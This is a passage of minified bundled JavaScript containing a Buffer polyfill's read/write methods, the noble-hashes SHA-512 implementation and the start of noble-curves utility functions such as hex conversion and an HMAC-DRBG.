m=m>>>0,v||D(m,1,this.length),this[m]&128?(255-this[m]+1)*-1:this[m]},a.prototype.readInt16LE=function(m,v){m=m>>>0,v||D(m,2,this.length);const F=this[m]|this[m+1]<<8;return F&32768?F|4294901760:F},a.prototype.readInt16BE=function(m,v){m=m>>>0,v||D(m,2,this.length);const F=this[m+1]|this[m]<<8;return F&32768?F|4294901760:F},a.prototype.readInt32LE=function(m,v){return m=m>>>0,v||D(m,4,this.length),this[m]|this[m+1]<<8|this[m+2]<<16|this[m+3]<<24},a.prototype.readInt32BE=function(m,v){return m=m>>>0,v||D(m,4,this.length),this[m]<<24|this[m+1]<<16|this[m+2]<<8|this[m+3]},a.prototype.readBigInt64LE=vn(function(m){m=m>>>0,Pt(m,"offset");const v=this[m],F=this[m+7];(v===void 0||F===void 0)&&We(m,this.length-8);const G=this[m+4]+this[m+5]*2**8+this[m+6]*2**16+(F<<24);return(BigInt(G)<<BigInt(32))+BigInt(v+this[++m]*2**8+this[++m]*2**16+this[++m]*2**24)}),a.prototype.readBigInt64BE=vn(function(m){m=m>>>0,Pt(m,"offset");const v=this[m],F=this[m+7];(v===void 0||F===void 0)&&We(m,this.length-8);const G=(v<<24)+this[++m]*2**16+this[++m]*2**8+this[++m];return(BigInt(G)<<BigInt(32))+BigInt(this[++m]*2**24+this[++m]*2**16+this[++m]*2**8+F)}),a.prototype.readFloatLE=function(m,v){return m=m>>>0,v||D(m,4,this.length),t.read(this,m,!0,23,4)},a.prototype.readFloatBE=function(m,v){return m=m>>>0,v||D(m,4,this.length),t.read(this,m,!1,23,4)},a.prototype.readDoubleLE=function(m,v){return m=m>>>0,v||D(m,8,this.length),t.read(this,m,!0,52,8)},a.prototype.readDoubleBE=function(m,v){return m=m>>>0,v||D(m,8,this.length),t.read(this,m,!1,52,8)};function y(P,m,v,F,G,J){if(!a.isBuffer(P))throw new TypeError('"buffer" argument must be a Buffer instance');if(m>G||m<J)throw new RangeError('"value" argument is out of bounds');if(v+F>P.length)throw new RangeError("Index out of range")}a.prototype.writeUintLE=a.prototype.writeUIntLE=function(m,v,F,G){if(m=+m,v=v>>>0,F=F>>>0,!G){const Oe=Math.pow(2,8*F)-1;y(this,m,v,F,Oe,0)}let J=1,te=0;for(this[v]=m&255;++te<F&&(J*=256);)this[v+te]=m/J&255;return v+F},a.prototype.writeUintBE=a.prototype.writeUIntBE=function(m,v,F,G){if(m=+m,v=v>>>0,F=F>>>0,!G){const Oe=Math.pow(2,8*F)-1;y(this,m,v,F,Oe,0)}let J=F-1,te=1;for(this[v+J]=m&255;--J>=0&&(te*=256);)this[v+J]=m/te&255;return v+F},a.prototype.writeUint8=a.prototype.writeUInt8=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,1,255,0),this[v]=m&255,v+1},a.prototype.writeUint16LE=a.prototype.writeUInt16LE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,2,65535,0),this[v]=m&255,this[v+1]=m>>>8,v+2},a.prototype.writeUint16BE=a.prototype.writeUInt16BE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,2,65535,0),this[v]=m>>>8,this[v+1]=m&255,v+2},a.prototype.writeUint32LE=a.prototype.writeUInt32LE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,4,4294967295,0),this[v+3]=m>>>24,this[v+2]=m>>>16,this[v+1]=m>>>8,this[v]=m&255,v+4},a.prototype.writeUint32BE=a.prototype.writeUInt32BE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,4,4294967295,0),this[v]=m>>>24,this[v+1]=m>>>16,this[v+2]=m>>>8,this[v+3]=m&255,v+4};function V(P,m,v,F,G){Ue(m,F,G,P,v,7);let J=Number(m&BigInt(4294967295));P[v++]=J,J=J>>8,P[v++]=J,J=J>>8,P[v++]=J,J=J>>8,P[v++]=J;let te=Number(m>>BigInt(32)&BigInt(4294967295));return P[v++]=te,te=te>>8,P[v++]=te,te=te>>8,P[v++]=te,te=te>>8,P[v++]=te,v}function oe(P,m,v,F,G){Ue(m,F,G,P,v,7);let J=Number(m&BigInt(4294967295));P[v+7]=J,J=J>>8,P[v+6]=J,J=J>>8,P[v+5]=J,J=J>>8,P[v+4]=J;let te=Number(m>>BigInt(32)&BigInt(4294967295));return P[v+3]=te,te=te>>8,P[v+2]=te,te=te>>8,P[v+1]=te,te=te>>8,P[v]=te,v+8}a.prototype.writeBigUInt64LE=vn(function(m,v=0){return V(this,m,v,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeBigUInt64BE=vn(function(m,v=0){return oe(this,m,v,BigInt(0),BigInt("0xffffffffffffffff"))}),a.prototype.writeIntLE=function(m,v,F,G){if(m=+m,v=v>>>0,!G){const Le=Math.pow(2,8*F-1);y(this,m,v,F,Le-1,-Le)}let J=0,te=1,Oe=0;for(this[v]=m&255;++J<F&&(te*=256);)m<0&&Oe===0&&this[v+J-1]!==0&&(Oe=1),this[v+J]=(m/te>>0)-Oe&255;return v+F},a.prototype.writeIntBE=function(m,v,F,G){if(m=+m,v=v>>>0,!G){const Le=Math.pow(2,8*F-1);y(this,m,v,F,Le-1,-Le)}let J=F-1,te=1,Oe=0;for(this[v+J]=m&255;--J>=0&&(te*=256);)m<0&&Oe===0&&this[v+J+1]!==0&&(Oe=1),this[v+J]=(m/te>>0)-Oe&255;return v+F},a.prototype.writeInt8=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,1,127,-128),m<0&&(m=255+m+1),this[v]=m&255,v+1},a.prototype.writeInt16LE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,2,32767,-32768),this[v]=m&255,this[v+1]=m>>>8,v+2},a.prototype.writeInt16BE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,2,32767,-32768),this[v]=m>>>8,this[v+1]=m&255,v+2},a.prototype.writeInt32LE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,4,2147483647,-2147483648),this[v]=m&255,this[v+1]=m>>>8,this[v+2]=m>>>16,this[v+3]=m>>>24,v+4},a.prototype.writeInt32BE=function(m,v,F){return m=+m,v=v>>>0,F||y(this,m,v,4,2147483647,-2147483648),m<0&&(m=4294967295+m+1),this[v]=m>>>24,this[v+1]=m>>>16,this[v+2]=m>>>8,this[v+3]=m&255,v+4},a.prototype.writeBigInt64LE=vn(function(m,v=0){return V(this,m,v,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),a.prototype.writeBigInt64BE=vn(function(m,v=0){return oe(this,m,v,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))});function ce(P,m,v,F,G,J){if(v+F>P.length)throw new RangeError("Index out of range");if(v<0)throw new RangeError("Index out of range")}function he(P,m,v,F,G){return m=+m,v=v>>>0,G||ce(P,m,v,4),t.write(P,m,v,F,23,4),v+4}a.prototype.writeFloatLE=function(m,v,F){return he(this,m,v,!0,F)},a.prototype.writeFloatBE=function(m,v,F){return he(this,m,v,!1,F)};function Ce(P,m,v,F,G){return m=+m,v=v>>>0,G||ce(P,m,v,8),t.write(P,m,v,F,52,8),v+8}a.prototype.writeDoubleLE=function(m,v,F){return Ce(this,m,v,!0,F)},a.prototype.writeDoubleBE=function(m,v,F){return Ce(this,m,v,!1,F)},a.prototype.copy=function(m,v,F,G){if(!a.isBuffer(m))throw new TypeError("argument should be a Buffer");if(F||(F=0),!G&&G!==0&&(G=this.length),v>=m.length&&(v=m.length),v||(v=0),G>0&&G<F&&(G=F),G===F||m.length===0||this.length===0)return 0;if(v<0)throw new RangeError("targetStart out of bounds");if(F<0||F>=this.length)throw new RangeError("Index out of range");if(G<0)throw new RangeError("sourceEnd out of bounds");G>this.length&&(G=this.length),m.length-v<G-F&&(G=m.length-v+F);const J=G-F;return this===m&&typeof Uint8Array.prototype.copyWithin=="function"?this.copyWithin(v,F,G):Uint8Array.prototype.set.call(m,this.subarray(F,G),v),J},a.prototype.fill=function(m,v,F,G){if(typeof m=="string"){if(typeof v=="string"?(G=v,v=0,F=this.length):typeof F=="string"&&(G=F,F=this.length),G!==void 0&&typeof G!="string")throw new TypeError("encoding must be a string");if(typeof G=="string"&&!a.isEncoding(G))throw new TypeError("Unknown encoding: "+G);if(m.length===1){const te=m.charCodeAt(0);(G==="utf8"&&te<128||G==="latin1")&&(m=te)}}else typeof m=="number"?m=m&255:typeof m=="boolean"&&(m=Number(m));if(v<0||this.length<v||this.length<F)throw new RangeError("Out of range index");if(F<=v)return this;v=v>>>0,F=F===void 0?this.length:F>>>0,m||(m=0);let J;if(typeof m=="number")for(J=v;J<F;++J)this[J]=m;else{const te=a.isBuffer(m)?m:a.from(m,G),Oe=te.length;if(Oe===0)throw new TypeError('The value "'+m+'" is invalid for argument "value"');for(J=0;J<F-v;++J)this[J+v]=te[J%Oe]}return this};const Ae={};function Pe(P,m,v){Ae[P]=class extends v{constructor(){super(),Object.defineProperty(this,"message",{value:m.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${P}]`,this.stack,delete this.name}get code(){return P}set code(G){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:G,writable:!0})}toString(){return`${this.name} [${P}]: ${this.message}`}}}Pe("ERR_BUFFER_OUT_OF_BOUNDS",function(P){return P?`${P} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"},RangeError),Pe("ERR_INVALID_ARG_TYPE",function(P,m){return`The "${P}" argument must be of type number. Received type ${typeof m}`},TypeError),Pe("ERR_OUT_OF_RANGE",function(P,m,v){let F=`The value of "${P}" is out of range.`,G=v;return Number.isInteger(v)&&Math.abs(v)>2**32?G=gt(String(v)):typeof v=="bigint"&&(G=String(v),(v>BigInt(2)**BigInt(32)||v<-(BigInt(2)**BigInt(32)))&&(G=gt(G)),G+="n"),F+=` It must be ${m}. Received ${G}`,F},RangeError);function gt(P){let m="",v=P.length;const F=P[0]==="-"?1:0;for(;v>=F+4;v-=3)m=`_${P.slice(v-3,v)}${m}`;return`${P.slice(0,v)}${m}`}function je(P,m,v){Pt(m,"offset"),(P[m]===void 0||P[m+v]===void 0)&&We(m,P.length-(v+1))}function Ue(P,m,v,F,G,J){if(P>v||P<m){const te=typeof m=="bigint"?"n":"";let Oe;throw J>3?m===0||m===BigInt(0)?Oe=`>= 0${te} and < 2${te} ** ${(J+1)*8}${te}`:Oe=`>= -(2${te} ** ${(J+1)*8-1}${te}) and < 2 ** ${(J+1)*8-1}${te}`:Oe=`>= ${m}${te} and <= ${v}${te}`,new Ae.ERR_OUT_OF_RANGE("value",Oe,P)}je(F,G,J)}function Pt(P,m){if(typeof P!="number")throw new Ae.ERR_INVALID_ARG_TYPE(m,"number",P)}function We(P,m,v){throw Math.floor(P)!==P?(Pt(P,v),new Ae.ERR_OUT_OF_RANGE(v||"offset","an integer",P)):m<0?new Ae.ERR_BUFFER_OUT_OF_BOUNDS:new Ae.ERR_OUT_OF_RANGE(v||"offset",`>= ${v?1:0} and <= ${m}`,P)}const Ke=/[^+/0-9A-Za-z-_]/g;function ji(P){if(P=P.split("=")[0],P=P.trim().replace(Ke,""),P.length<2)return"";for(;P.length%4!==0;)P=P+"=";return P}function ot(P,m){m=m||1/0;let v;const F=P.length;let G=null;const J=[];for(let te=0;te<F;++te){if(v=P.charCodeAt(te),v>55295&&v<57344){if(!G){if(v>56319){(m-=3)>-1&&J.push(239,191,189);continue}else if(te+1===F){(m-=3)>-1&&J.push(239,191,189);continue}G=v;continue}if(v<56320){(m-=3)>-1&&J.push(239,191,189),G=v;continue}v=(G-55296<<10|v-56320)+65536}else G&&(m-=3)>-1&&J.push(239,191,189);if(G=null,v<128){if((m-=1)<0)break;J.push(v)}else if(v<2048){if((m-=2)<0)break;J.push(v>>6|192,v&63|128)}else if(v<65536){if((m-=3)<0)break;J.push(v>>12|224,v>>6&63|128,v&63|128)}else if(v<1114112){if((m-=4)<0)break;J.push(v>>18|240,v>>12&63|128,v>>6&63|128,v&63|128)}else throw new Error("Invalid code point")}return J}function vt(P){const m=[];for(let v=0;v<P.length;++v)m.push(P.charCodeAt(v)&255);return m}function Vi(P,m){let v,F,G;const J=[];for(let te=0;te<P.length&&!((m-=2)<0);++te)v=P.charCodeAt(te),F=v>>8,G=v%256,J.push(G),J.push(F);return J}function at(P){return e.toByteArray(ji(P))}function Xe(P,m,v,F){let G;for(G=0;G<F&&!(G+v>=m.length||G>=P.length);++G)m[G+v]=P[G];return G}function an(P,m){return P instanceof m||P!=null&&P.constructor!=null&&P.constructor.name!=null&&P.constructor.name===m.name}function lt(P){return P!==P}const ct=function(){const P="0123456789abcdef",m=new Array(256);for(let v=0;v<16;++v){const F=v*16;for(let G=0;G<16;++G)m[F+G]=P[v]+P[G]}return m}();function vn(P){return typeof BigInt>"u"?ut:P}function ut(){throw new Error("BigInt not supported")}})(ve);function cE(n){if(!Number.isSafeInteger(n)||n<0)throw new Error("positive integer expected, got "+n)}function zP(n){return n instanceof Uint8Array||ArrayBuffer.isView(n)&&n.constructor.name==="Uint8Array"}function Ep(n,...e){if(!zP(n))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(n.length))throw new Error("Uint8Array expected of length "+e+", got length="+n.length)}function WP(n){if(typeof n!="function"||typeof n.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");cE(n.outputLen),cE(n.blockLen)}function Ed(n,e=!0){if(n.destroyed)throw new Error("Hash instance has been destroyed");if(e&&n.finished)throw new Error("Hash#digest() has already been called")}function $P(n,e){Ep(n);const t=e.outputLen;if(n.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const Wa=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function Kg(n){return new DataView(n.buffer,n.byteOffset,n.byteLength)}function vi(n,e){return n<<32-e|n>>>e}function HP(n){if(typeof n!="string")throw new Error("utf8ToBytes expected string, got "+typeof n);return new Uint8Array(new TextEncoder().encode(n))}function Fw(n){return typeof n=="string"&&(n=HP(n)),Ep(n),n}function qP(...n){let e=0;for(let r=0;r<n.length;r++){const i=n[r];Ep(i),e+=i.length}const t=new Uint8Array(e);for(let r=0,i=0;r<n.length;r++){const s=n[r];t.set(s,i),i+=s.length}return t}class rb{clone(){return this._cloneInto()}}function ib(n){const e=r=>n().update(Fw(r)).digest(),t=n();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>n(),e}function sb(n=32){if(Wa&&typeof Wa.getRandomValues=="function")return Wa.getRandomValues(new Uint8Array(n));if(Wa&&typeof Wa.randomBytes=="function")return Wa.randomBytes(n);throw new Error("crypto.getRandomValues must be defined")}function KP(n,e,t,r){if(typeof n.setBigUint64=="function")return n.setBigUint64(e,t,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(t>>i&s),a=Number(t&s),l=r?4:0,u=r?0:4;n.setUint32(e+l,o,r),n.setUint32(e+u,a,r)}function GP(n,e,t){return n&e^~n&t}function QP(n,e,t){return n&e^n&t^e&t}class ob extends rb{constructor(e,t,r,i){super(),this.blockLen=e,this.outputLen=t,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Kg(this.buffer)}update(e){Ed(this);const{view:t,buffer:r,blockLen:i}=this;e=Fw(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const l=Kg(e);for(;i<=s-o;o+=i)this.process(l,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Ed(this),$P(e,this),this.finished=!0;const{buffer:t,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let f=o;f<i;f++)t[f]=0;KP(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=Kg(e),l=this.outputLen;if(l%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const u=l/4,h=this.get();if(u>h.length)throw new Error("_sha2: outputLen bigger than state");for(let f=0;f<u;f++)a.setUint32(4*f,h[f],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const r=e.slice(0,t);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%t&&e.buffer.set(r),e}}const rf=BigInt(2**32-1),D0=BigInt(32);function ab(n,e=!1){return e?{h:Number(n&rf),l:Number(n>>D0&rf)}:{h:Number(n>>D0&rf)|0,l:Number(n&rf)|0}}function YP(n,e=!1){let t=new Uint32Array(n.length),r=new Uint32Array(n.length);for(let i=0;i<n.length;i++){const{h:s,l:o}=ab(n[i],e);[t[i],r[i]]=[s,o]}return[t,r]}const ZP=(n,e)=>BigInt(n>>>0)<<D0|BigInt(e>>>0),JP=(n,e,t)=>n>>>t,XP=(n,e,t)=>n<<32-t|e>>>t,e4=(n,e,t)=>n>>>t|e<<32-t,t4=(n,e,t)=>n<<32-t|e>>>t,n4=(n,e,t)=>n<<64-t|e>>>t-32,r4=(n,e,t)=>n>>>t-32|e<<64-t,i4=(n,e)=>e,s4=(n,e)=>n,o4=(n,e,t)=>n<<t|e>>>32-t,a4=(n,e,t)=>e<<t|n>>>32-t,l4=(n,e,t)=>e<<t-32|n>>>64-t,c4=(n,e,t)=>n<<t-32|e>>>64-t;function u4(n,e,t,r){const i=(e>>>0)+(r>>>0);return{h:n+t+(i/2**32|0)|0,l:i|0}}const h4=(n,e,t)=>(n>>>0)+(e>>>0)+(t>>>0),f4=(n,e,t,r)=>e+t+r+(n/2**32|0)|0,d4=(n,e,t,r)=>(n>>>0)+(e>>>0)+(t>>>0)+(r>>>0),p4=(n,e,t,r,i)=>e+t+r+i+(n/2**32|0)|0,g4=(n,e,t,r,i)=>(n>>>0)+(e>>>0)+(t>>>0)+(r>>>0)+(i>>>0),m4=(n,e,t,r,i,s)=>e+t+r+i+s+(n/2**32|0)|0,y4={fromBig:ab,split:YP,toBig:ZP,shrSH:JP,shrSL:XP,rotrSH:e4,rotrSL:t4,rotrBH:n4,rotrBL:r4,rotr32H:i4,rotr32L:s4,rotlSH:o4,rotlSL:a4,rotlBH:l4,rotlBL:c4,add:u4,add3L:h4,add3H:f4,add4L:d4,add4H:p4,add5H:m4,add5L:g4},Fe=y4,[w4,v4]=(()=>Fe.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(n=>BigInt(n))))(),xs=new Uint32Array(80),ks=new Uint32Array(80);class _4 extends ob{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:t,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:l,Eh:u,El:h,Fh:f,Fl:p,Gh:w,Gl:x,Hh:k,Hl:I}=this;return[e,t,r,i,s,o,a,l,u,h,f,p,w,x,k,I]}set(e,t,r,i,s,o,a,l,u,h,f,p,w,x,k,I){this.Ah=e|0,this.Al=t|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=l|0,this.Eh=u|0,this.El=h|0,this.Fh=f|0,this.Fl=p|0,this.Gh=w|0,this.Gl=x|0,this.Hh=k|0,this.Hl=I|0}process(e,t){for(let E=0;E<16;E++,t+=4)xs[E]=e.getUint32(t),ks[E]=e.getUint32(t+=4);for(let E=16;E<80;E++){const O=xs[E-15]|0,W=ks[E-15]|0,q=Fe.rotrSH(O,W,1)^Fe.rotrSH(O,W,8)^Fe.shrSH(O,W,7),L=Fe.rotrSL(O,W,1)^Fe.rotrSL(O,W,8)^Fe.shrSL(O,W,7),N=xs[E-2]|0,B=ks[E-2]|0,z=Fe.rotrSH(N,B,19)^Fe.rotrBH(N,B,61)^Fe.shrSH(N,B,6),$=Fe.rotrSL(N,B,19)^Fe.rotrBL(N,B,61)^Fe.shrSL(N,B,6),K=Fe.add4L(L,$,ks[E-7],ks[E-16]),S=Fe.add4H(K,q,z,xs[E-7],xs[E-16]);xs[E]=S|0,ks[E]=K|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:l,Dh:u,Dl:h,Eh:f,El:p,Fh:w,Fl:x,Gh:k,Gl:I,Hh:A,Hl:b}=this;for(let E=0;E<80;E++){const O=Fe.rotrSH(f,p,14)^Fe.rotrSH(f,p,18)^Fe.rotrBH(f,p,41),W=Fe.rotrSL(f,p,14)^Fe.rotrSL(f,p,18)^Fe.rotrBL(f,p,41),q=f&w^~f&k,L=p&x^~p&I,N=Fe.add5L(b,W,L,v4[E],ks[E]),B=Fe.add5H(N,A,O,q,w4[E],xs[E]),z=N|0,$=Fe.rotrSH(r,i,28)^Fe.rotrBH(r,i,34)^Fe.rotrBH(r,i,39),K=Fe.rotrSL(r,i,28)^Fe.rotrBL(r,i,34)^Fe.rotrBL(r,i,39),S=r&s^r&a^s&a,d=i&o^i&l^o&l;A=k|0,b=I|0,k=w|0,I=x|0,w=f|0,x=p|0,{h:f,l:p}=Fe.add(u|0,h|0,B|0,z|0),u=a|0,h=l|0,a=s|0,l=o|0,s=r|0,o=i|0;const _=Fe.add3L(z,K,d);r=Fe.add3H(_,B,$,S),i=_|0}({h:r,l:i}=Fe.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=Fe.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l}=Fe.add(this.Ch|0,this.Cl|0,a|0,l|0),{h:u,l:h}=Fe.add(this.Dh|0,this.Dl|0,u|0,h|0),{h:f,l:p}=Fe.add(this.Eh|0,this.El|0,f|0,p|0),{h:w,l:x}=Fe.add(this.Fh|0,this.Fl|0,w|0,x|0),{h:k,l:I}=Fe.add(this.Gh|0,this.Gl|0,k|0,I|0),{h:A,l:b}=Fe.add(this.Hh|0,this.Hl|0,A|0,b|0),this.set(r,i,s,o,a,l,u,h,f,p,w,x,k,I,A,b)}roundClean(){xs.fill(0),ks.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const E4=ib(()=>new _4);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Ip=BigInt(0),Sp=BigInt(1),I4=BigInt(2);function ua(n){return n instanceof Uint8Array||ArrayBuffer.isView(n)&&n.constructor.name==="Uint8Array"}function uh(n){if(!ua(n))throw new Error("Uint8Array expected")}function os(n,e){if(typeof e!="boolean")throw new Error(n+" boolean expected, got "+e)}const S4=Array.from({length:256},(n,e)=>e.toString(16).padStart(2,"0"));function ha(n){uh(n);let e="";for(let t=0;t<n.length;t++)e+=S4[n[t]];return e}function cl(n){const e=n.toString(16);return e.length&1?"0"+e:e}function zw(n){if(typeof n!="string")throw new Error("hex string expected, got "+typeof n);return n===""?Ip:BigInt("0x"+n)}const $i={_0:48,_9:57,A:65,F:70,a:97,f:102};function uE(n){if(n>=$i._0&&n<=$i._9)return n-$i._0;if(n>=$i.A&&n<=$i.F)return n-($i.A-10);if(n>=$i.a&&n<=$i.f)return n-($i.a-10)}function Dl(n){if(typeof n!="string")throw new Error("hex string expected, got "+typeof n);const e=n.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(t);for(let i=0,s=0;i<t;i++,s+=2){const o=uE(n.charCodeAt(s)),a=uE(n.charCodeAt(s+1));if(o===void 0||a===void 0){const l=n[s]+n[s+1];throw new Error('hex string expected, got non-hex character "'+l+'" at index '+s)}r[i]=o*16+a}return r}function na(n){return zw(ha(n))}function _l(n){return uh(n),zw(ha(Uint8Array.from(n).reverse()))}function Ol(n,e){return Dl(n.toString(16).padStart(e*2,"0"))}function Uu(n,e){return Ol(n,e).reverse()}function T4(n){return Dl(cl(n))}function un(n,e,t){let r;if(typeof e=="string")try{r=Dl(e)}catch(s){throw new Error(n+" must be hex string or Uint8Array, cause: "+s)}else if(ua(e))r=Uint8Array.from(e);else throw new Error(n+" must be hex string or Uint8Array");const i=r.length;if(typeof t=="number"&&i!==t)throw new Error(n+" of length "+t+" expected, got "+i);return r}function fa(...n){let e=0;for(let r=0;r<n.length;r++){const i=n[r];uh(i),e+=i.length}const t=new Uint8Array(e);for(let r=0,i=0;r<n.length;r++){const s=n[r];t.set(s,i),i+=s.length}return t}function A4(n,e){if(n.length!==e.length)return!1;let t=0;for(let r=0;r<n.length;r++)t|=n[r]^e[r];return t===0}function b4(n){if(typeof n!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(n))}const Gg=n=>typeof n=="bigint"&&Ip<=n;function Tp(n,e,t){return Gg(n)&&Gg(e)&&Gg(t)&&e<=n&&n<t}function $r(n,e,t,r){if(!Tp(e,t,r))throw new Error("expected valid "+n+": "+t+" <= n < "+r+", got "+e)}function lb(n){let e;for(e=0;n>Ip;n>>=Sp,e+=1);return e}function x4(n,e){return n>>BigInt(e)&Sp}function k4(n,e,t){return n|(t?Sp:Ip)<<BigInt(e)}const Ww=n=>(I4<<BigInt(n-1))-Sp,Qg=n=>new Uint8Array(n),hE=n=>Uint8Array.from(n);function cb(n,e,t){if(typeof n!="number"||n<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");let r=Qg(n),i=Qg(n),s=0;const o=()=>{r.fill(1),i.fill(0),s=0},a=(...f)=>t(i,r,...f),l=(f=Qg())=>{i=a(hE([0]),f),r=a(),f.length!==0&&(i=a(hE([1]),f),r=a())},u=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let f=0;const p=[];for(;f<e;){r=a();const w=r.slice();p.push(w),f+=r.length}return fa(...p)};return(f,p)=>{o(),l(f);let w;for(;!(w=p(u()));)l();return o(),w}}const C4={bigint:n=>typeof n=="bigint",function:n=>typeof n=="function",boolean:n=>typeof n=="boolean",string:n=>typeof n=="string",stringOrUint8Array:n=>typeof n=="string"||ua(n),isSafeInteger:n=>Number.isSafeInteger(n),array:n=>Array.isArray(n),field:(n,e)=>e.Fp.isValid(n),hash:n=>typeof n=="function"&&Number.isSafeInteger(n.outputLen)};function ic(n,e,t={}){const r=(i,s,o)=>{const a=C4[s];if(typeof a!="function")throw new Error("invalid validator function");const l=n[i];if(!(o&&l===void 0)&&!a(l,n))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+l)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(t))r(i,s,!0);return n}const R4=()=>{throw new Error("not implemented")};function ju(n){const e=new WeakMap;return(t,...r)=>{const i=e.get(t);if(i!==void 0)return i;const s=n(t,...r);return e.set(t,s),s}}const 